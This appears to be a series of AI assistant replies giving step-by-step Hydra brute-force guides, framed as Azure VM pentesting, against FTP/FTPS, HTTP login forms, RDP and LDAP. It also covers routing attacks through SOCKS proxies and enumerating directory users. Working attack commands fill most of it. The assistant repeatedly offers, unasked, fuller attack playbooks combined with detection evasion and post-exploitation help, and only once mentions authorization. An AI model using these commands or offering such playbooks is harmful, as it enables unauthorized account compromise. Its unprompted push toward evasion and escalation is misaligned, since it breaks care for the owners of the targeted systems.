------------------------------------------------------------------------

**3. Attacking Multiple Hosts (-M option)**

When attacking several hosts, use a file with target IPs:

hydra -L users.txt -P pass.txt -M hosts.txt ftp

- hosts.txt contains list of IP addresses or hostnames

- Hydra attempts all username/password combos on each host

**Exit after first success per host:**

hydra -L users.txt -P pass.txt -M hosts.txt ftp -F

- -F stops brute force on a host once credentials are found (saves time)

------------------------------------------------------------------------

**4. Using Combo Entries (-C option)**

If you have known username:password combos, put them in a
colon-separated file:

ignite:123

admin:password

user1:welcome1

Run Hydra with:

hydra -C userpass.txt ftp://192.168.1.141 -V

- Faster than separate username/password wordlists because combos tested
  directly

------------------------------------------------------------------------

**5. Concurrent Attempts (-t option)**

To speed up brute forcing, run multiple concurrent attempts:

hydra -L users.txt -P pass.txt ftp://192.168.1.141 -t 3 -V

- -t 3 runs 3 simultaneous login attempts

- Helpful to reduce total brute force time

------------------------------------------------------------------------

**Summary of Important Hydra Options**

| **Option** | **Description** | **Example** |
|----|----|----|
| -l | Single username | -l ignite |
| -L | Username list file | -L users.txt |
| -p | Single password | -p 123 |
| -P | Password list file | -P pass.txt |
| -C | Combo file (user:pass) | -C userpass.txt |
| -x | Password generator with charset (min:max:charset) | -x 1:3:1 |
| -s | Specify service port | -s 2222 |
| -M | Multiple hosts file | -M hosts.txt |
| -F | Stop attack after first valid credential on each host | -F |
| -t | Number of concurrent attempts | -t 3 |
| -V | Verbose output | -V |

------------------------------------------------------------------------

**6. Azure VM Vulnerabilities Exploited**

- **Weak or predictable passwords** (null, username, reversed username,
  default creds)

- **Misconfigured services running on non-standard ports**

- **No account lockout or rate-limiting on login attempts**

- **Multiple exposed hosts in the subnet without proper segmentation**

- **Lack of multi-factor authentication (MFA) on Azure AD accounts**

- **Insufficient logging and alerting on brute force attempts**

------------------------------------------------------------------------

If you want, I can help prepare full attack playbooks or automate these
steps with scripts and combine with detection evasion techniques.

------------------------------------------------------------------------

Would you like me to prepare a similar detailed guide for Azure AD
password spraying or post-exploitation after valid credentials are
obtained?

Certainly! Here's a **corrected, detailed, and concise summary** of how
to perform HTTP login form brute forcing on Azure Windows/Linux VMs
targeting Local accounts, AD accounts, and Microsoft Entra ID accounts
(where applicable), focusing on every minute detail, commands used, and
vulnerabilities exploited, without duplicates:

------------------------------------------------------------------------

**Azure VM Pentesting: HTTP Login Form Brute Force Using Hydra**

------------------------------------------------------------------------

**Objective**

Perform brute force attacks on web-based login forms hosted on Azure
Windows/Linux VMs to crack credentials for:

- **Local accounts** (e.g., local app users)

- **Active Directory accounts** (if web app uses domain auth)

- **Microsoft Entra ID accounts** (for apps federated with Azure AD)

------------------------------------------------------------------------

**Step-by-Step Process**

**1. Identify Target Login Form**

- Inspect the web login page source code and behavior:

  - Determine if the form uses **GET** or **POST** method

  - Identify form parameters for username and password fields (e.g.,
    username, password)

  - Identify login failure message to use as a failure condition in
    brute forcing

  - If session or security cookies are required, note their names and
    values (e.g., PHPSESSID, security)

------------------------------------------------------------------------

**2. Example Scenario: DVWA (Damn Vulnerable Web App)**

- Target URL: http://192.168.1.150/dvwa/login.php

- Uses **POST** method with parameters:

  - username

  - password

  - Login=Login

- Failure message: Login failed

------------------------------------------------------------------------

**3. Command to Perform POST Form Brute Force**

hydra -l admin -P pass.txt 192.168.1.150 http-post-form \\

"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login
failed" -V

- -l admin: single username admin

- -P pass.txt: password list file

- http-post-form: Hydra module for POST form attacks

- Syntax after target:

  - /path:POST-data:failure-string

  - ^USER^ and ^PASS^ are placeholders Hydra replaces per attempt

- -V: verbose mode to show each attempt

**Outcome:** Successfully brute forced password password for user admin.

------------------------------------------------------------------------

**4. Handling Cookies and Security Tokens**

- Use browser tools (e.g., Cookie Editor plugin) to extract cookies like
  PHPSESSID or security level tokens

- Add cookie header in Hydra command using H= option to maintain session
  state during brute forcing

Example for GET method login with cookies:

hydra 192.168.1.150 -l admin -P pass.txt http-get-form \\

"/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username
and/or password
incorrect.:H=Cookie:PHPSESSID=13f2650bddf7a9ef68858ceea03c5d;
security=low" -V

- http-get-form: Hydra module for GET form

- F=Username and/or password incorrect.: failure string to detect login
  failure

- H=Cookie:...: adds required cookies to each HTTP request

------------------------------------------------------------------------

**5. Determine Correct HTTP Module**

- Use http-get-form if form submits via GET method

- Use http-post-form if form submits via POST method

- Inspect page source or browser dev tools (Network tab) to confirm

------------------------------------------------------------------------

**6. Hydra Help and Usage Information**

- To list supported services by Hydra:

hydra -h

- To get detailed usage for a specific module (e.g., http-get-form):

hydra http-get-form -U

------------------------------------------------------------------------

**Azure VM Vulnerabilities Exploited**

- **Weak or reused passwords** on web app login forms

- Lack of **account lockout** or **rate limiting** on login attempts

- Insufficient **session validation** or **token handling**

- Absence of **multi-factor authentication (MFA)**

- Poor **logging and alerting** for brute force attempts on web apps

------------------------------------------------------------------------

**Summary**

| **Task** | **Command Example** | **Notes** |
|----|----|----|
| POST form brute force | hydra -l admin -P pass.txt 192.168.1.150 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V | Use form params & failure string |
| GET form brute force + cookie | hydra 192.168.1.150 -l admin -P pass.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username or password incorrect.:H=Cookie:PHPSESSID=VALUE; security=low" -V | Add cookies for session maintenance |
| Check supported services | hydra -h | Lists all supported service modules |
| Get usage of service module | hydra http-get-form -U | Shows usage details for module |

------------------------------------------------------------------------

Would you like me to prepare practical examples for Azure AD Federated
app brute forcing or ways to detect and mitigate such attacks?

Certainly! Here's a corrected and concise **step-by-step summary** of
how to pentest Azure Windows/Linux VMs for **Local accounts, AD
accounts, and Microsoft Entra ID accounts** focusing on attacking
**secured services and proxy support**, including commands,
vulnerabilities exploited, and detailed operational steps without
duplicates:

------------------------------------------------------------------------

**Azure VM Pentesting: Attacking Secured Service Connections & Proxy
Support**

------------------------------------------------------------------------

**Objective**

- Perform brute force attacks on services running on Azure VMs that are
  **secured** (e.g., FTPS instead of FTP).

- Bypass proxy restrictions during brute force attempts.

- Target Local, AD, and Microsoft Entra ID accounts exposed via
  vulnerable services.

------------------------------------------------------------------------

**1. Attacking Secured Service Connections (Example: FTPS)**

**Problem:**

- Brute forcing plain FTP using Hydra on a secured FTP server (FTPS)
  fails because Hydra expects an unsecured connection by default.

**Correct Method:**

- For **unsecured FTP**:

- hydra -l ignite -P pass.txt ftp://192.168.1.141

Often results in **0 valid passwords** if the service is secured.

- For **secured FTP (FTPS)**:

- hydra -l ignite -P pass.txt ftps://192.168.1.141

This works and finds valid credentials because it uses SSL/TLS properly.

- Alternatively, specify service explicitly:

- hydra -l ignite -P pass.txt 192.168.1.141 ftp

- hydra -l ignite -P pass.txt 192.168.1.141 ftps

The second command succeeds if the server supports FTPS.

**Vulnerabilities Exploited:**

- Weak or default passwords on secured services.

- Lack of account lockout or intrusion prevention on secure protocols.

------------------------------------------------------------------------

**2. Proxy Support in Brute Force Attacks**

**Scenario:**

- Target Azure VM or service sits behind a **proxy** (e.g., SOCKS5
  proxy) which may be **unauthenticated** or **authenticated**.

**Step 1: Detect Proxy**

- Run nmap or other port scans to detect proxy services (e.g., open
  SOCKS proxy on port 1080):

- nmap -p 1080 192.168.1.141

------------------------------------------------------------------------

**Step 2: Attacking Through Unauthenticated Proxy**

- **Method 1: Export Environment Variable**

- export HYDRA_PROXY=socks5://192.168.1.141:1080

- hydra -l ignite -P pass.txt 192.168.1.141 ftp

This routes Hydra traffic through the proxy.

- **Method 2: Using Proxychains**

  - Add proxy to /etc/proxychains4.conf:

  - socks5 192.168.1.141 1080

  - Run Hydra via proxychains:

  - proxychains hydra -l ignite -P pass.txt 192.168.1.141 ftp

**Step 3: Attacking Through Authenticated Proxy**

- Proxychains alone will fail without credentials.

- Add proxy username and password in /etc/proxychains4.conf:

- socks5 username password 192.168.1.141 1080

- Run brute force again:

- proxychains hydra -l ignite -P pass.txt 192.168.1.141 ftp

- Alternatively, export environment variable with credentials:

- export HYDRA_PROXY=socks5://raj:1234@192.168.1.141:1080

- hydra -l ignite -P pass.txt 192.168.1.141 ftp

**Vulnerabilities Exploited:**

- Unprotected or misconfigured proxies that allow brute forcing
  services.

- Weak proxy authentication (or no authentication).

- Lack of monitoring or blocking proxy-based brute force attacks.

------------------------------------------------------------------------

**Summary Table**

| **Step** | **Command Example** | **Notes** |
|----|----|----|
| Plain FTP brute force | hydra -l ignite -P pass.txt ftp://192.168.1.141 | Fails on secured FTP |
| Secured FTPS brute force | hydra -l ignite -P pass.txt ftps://192.168.1.141 | Works with SSL/TLS |
| Explicit service brute force | hydra -l ignite -P pass.txt 192.168.1.141 ftps | Alternative to URL style |
| Detect proxy | nmap -p 1080 192.168.1.141 | Look for SOCKS proxy |
| Unauthenticated proxy (env var) | export HYDRA_PROXY=socks5://192.168.1.141:1080 + hydra -l ignite -P pass.txt 192.168.1.141 ftp | Simple proxy support |
| Unauthenticated proxy (proxychains) | Add proxy in /etc/proxychains4.conf + proxychains hydra -l ignite -P pass.txt 192.168.1.141 ftp | Alternative toolchain |
| Authenticated proxy (proxychains) | Add user/pass in /etc/proxychains4.conf + run proxychains hydra -l ignite -P pass.txt 192.168.1.141 ftp | Requires valid proxy credentials |
| Authenticated proxy (env var) | export HYDRA_PROXY=socks5://username:password@192.168.1.141:1080 + hydra -l ignite -P pass.txt 192.168.1.141 ftp | Simple authenticated proxy usage |

------------------------------------------------------------------------

**Additional Notes:**

- Hydra supports various protocols and secured connections (e.g., HTTPS,
  FTPS, SMTPS).

- Always verify the service port and protocol before brute forcing.

- Proxy detection and usage is critical in cloud environments where
  proxy or firewall controls exist.

- Brute forcing should respect target policies and be part of authorized
  penetration tests only.

------------------------------------------------------------------------

Would you like me to extend this with commands for attacking Windows
Remote Desktop or LDAP services on Azure VMs?

Great! Here's the extension to include **Windows RDP** and **LDAP
(Active Directory) service brute forcing** on Azure Windows/Linux VMs
for Local accounts, AD accounts, and Microsoft Entra ID accounts:

------------------------------------------------------------------------

**Extended Azure VM Pentesting Guide: RDP & LDAP Brute Forcing**

------------------------------------------------------------------------

**3. Brute Forcing Windows Remote Desktop (RDP)**

**Context**

- RDP (default port 3389) is widely used for Windows VM access.

- Weak or reused passwords on Local or AD accounts can be brute forced
  remotely.

- Azure VMs often have NSGs (Network Security Groups) restricting RDP,
  but if open, it's a key attack vector.

**Tools**

- **Hydra** supports RDP brute forcing via the rdp module.

- **Ncrack** is specialized for network authentication brute forcing,
  including RDP.

------------------------------------------------------------------------

**Step 1: Scan for RDP port**

nmap -p 3389 --open -sV 10.0.0.10

------------------------------------------------------------------------

**Step 2: RDP Brute Force with Hydra**

hydra -L users.txt -P pass.txt 10.0.0.10 rdp

- -L users.txt: File containing usernames (local or AD)

- -P pass.txt: File containing passwords to try

- 10.0.0.10: Target Azure VM private/public IP

------------------------------------------------------------------------

**Step 3: Concurrent attempts (optional)**

hydra -L users.txt -P pass.txt 10.0.0.10 rdp -t 4 -V

- -t 4: Four concurrent login attempts

- -V: Verbose mode (shows each try)

------------------------------------------------------------------------

**Vulnerabilities Exploited:**

- Weak passwords for Local or AD accounts on Azure Windows VMs.

- Misconfigured or open NSG rules allowing RDP access.

- No account lockout or monitoring on failed RDP login attempts.

------------------------------------------------------------------------

**4. Brute Forcing LDAP (Active Directory) Service**

**Context**

- LDAP runs on TCP 389 (unencrypted) or 636 (LDAPS).

- Exposed LDAP interfaces allow enumeration and brute force of AD
  accounts.

- Azure AD DS or hybrid AD setups expose LDAP/LDAPS.

------------------------------------------------------------------------

**Step 1: Scan for LDAP port**

nmap -p 389,636 --open -sV 10.0.0.10

------------------------------------------------------------------------

**Step 2: Brute Force LDAP Bind with Hydra**

hydra -L users.txt -P pass.txt ldap://10.0.0.10 -s 389 ldap-bind

- ldap-bind is the module for LDAP authentication brute forcing.

- Use -s to specify port if non-default.

**Step 3: For LDAPS (secure LDAP)**

hydra -L users.txt -P pass.txt ldaps://10.0.0.10 -s 636 ldap-bind

------------------------------------------------------------------------

**Step 4: Using ldapsearch for enumeration**

Before brute forcing, enumerate users:

ldapsearch -x -H ldap://10.0.0.10 -b "dc=example,dc=com"
"(objectClass=user)"

- This helps build user lists for brute forcing.

------------------------------------------------------------------------

**Vulnerabilities Exploited:**

- Weak passwords on AD accounts.

- Misconfigured LDAP/LDAPS allowing anonymous binds or no encryption.

- Lack of monitoring or lockout on LDAP binds.

------------------------------------------------------------------------

**Summary Table for RDP & LDAP**

| **Service** | **Port** | **Command Example** | **Notes** |
|----|----|----|----|
| RDP | 3389 | hydra -L users.txt -P pass.txt 10.0.0.10 rdp | Windows Remote Desktop brute force |
| RDP (concurrent) | 3389 | hydra -L users.txt -P pass.txt 10.0.0.10 rdp -t 4 -V | Faster, verbose |
| LDAP | 389 | hydra -L users.txt -P pass.txt ldap://10.0.0.10 -s 389 ldap-bind | LDAP bind brute force |
| LDAPS | 636 | hydra -L users.txt -P pass.txt ldaps://10.0.0.10 -s 636 ldap-bind | Secure LDAP brute force |
| LDAP Enum | 389 | ldapsearch -x -H ldap://10.0.0.10 -b "dc=example,dc=com" "(objectClass=user)" | Enumerate AD users |

------------------------------------------------------------------------

**General Recommendations for Azure VM Pentesting:**

- Confirm open ports with **Nmap** or **Azure NSG flow logs** before
  brute forcing.

- Always validate password lists and usernames through enumeration tools
  (e.g., ldapsearch, BloodHound).

- Use proxy or VPN methods if target environment requires network
  pivoting.

- Respect Azure Defender and Microsoft Sentinel alerts; avoid noisy
  attacks if detection avoidance is required.

------------------------------------------------------------------------

If you'd like, I can prepare step-by-step guides for:

- Exploiting Microsoft Entra ID OAuth applications

- Attacking Azure AD Connect sync servers

- Using tools like BloodHound or AzureHound for privilege escalation
  mapping
